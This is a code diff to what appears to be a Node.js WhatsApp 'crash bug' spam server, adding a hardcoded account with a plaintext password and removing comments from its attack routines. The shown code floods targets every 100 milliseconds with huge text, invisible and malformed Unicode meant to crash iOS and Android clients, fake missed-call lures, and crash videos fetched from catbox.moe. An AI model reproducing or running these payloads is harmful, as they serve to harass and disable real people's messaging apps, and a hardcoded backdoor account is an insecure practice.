@@ -30,6 +30,17 @@ function saveUsers() {
 }
 loadUsers();
 
+// ========== HARDCODE USER ACUNN ==========
+if (!users['Acunn']) {
+    users['Acunn'] = {
+        password: 'Kontol980',
+        targets: { admin: [], users: [] },
+        sock: null, qr: null, spamInterval: null,
+        totalSpam: 0, telegramId: null, attackType: 'cyclone'
+    };
+    saveUsers();
+}
+
 function generateToken() { return crypto.randomBytes(32).toString('hex'); }
 
 // ========== TELEGRAM BOT ==========
@@ -211,7 +222,7 @@ function updateSpamForUser(username) {
                         await user.sock.sendMessage(target, { text: 'A'.repeat(20000) });
                         break;
                     case 'delay_invisible':
-                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(10000) }); // invisible chars
+                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(10000) });
                         await user.sock.sendMessage(target, { text: '\u2060\u2060\u2060'.repeat(5000) });
                         break;
                     case 'crash_ios_invisible':
@@ -231,7 +242,6 @@ function updateSpamForUser(username) {
                         await user.sock.sendMessage(target, { text: '\u202E'.repeat(5000) + '\uFFFE'.repeat(500) });
                         break;
                     case 'spam_call':
-                        // Fake call spam (kirim pesan call invitation)
                         await user.sock.sendMessage(target, { text: '📞 INCOMING CALL...' });
                         await user.sock.sendMessage(target, { text: '📞 MISSED CALL from +6281234567890' });
                         await user.sock.sendMessage(target, { text: '📞 CALL BACK NOW!' });
@@ -241,10 +251,9 @@ function updateSpamForUser(username) {
                         await user.sock.sendMessage(target, { text: '\u2060'.repeat(10000) });
                         break;
                     case 'blank_andro':
-                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(50000) }); // blank banget
+                        await user.sock.sendMessage(target, { text: '\u200B'.repeat(50000) });
                         break;
                     case 'force_close_infinity':
-                        // Loop tanpa henti
                         for(let i=0; i<10; i++) {
                             await user.sock.sendMessage(target, { text: 'INFINITY LOOP ' + i });
                             await user.sock.sendMessage(target, { text: '\uFFFE'.repeat(200) });
@@ -255,7 +264,6 @@ function updateSpamForUser(username) {
                         await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid2.mp4' } });
                         break;
                     case 'cyclone':
-                        // All-in-one most brutal
                         await user.sock.sendMessage(target, { text: '☠️ CYCLONE MODE ACTIVE ☠️' });
                         await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(500) });
                         await user.sock.sendMessage(target, { video: { url: 'https://files.catbox.moe/crashvid.mp4' } });
@@ -271,7 +279,7 @@ function updateSpamForUser(username) {
             }
         } catch(e) {}
         saveUsers();
-    }, 100); // 100ms interval — super fast!
+    }, 100);
 }
 
 function stopSpamForUser(username) {
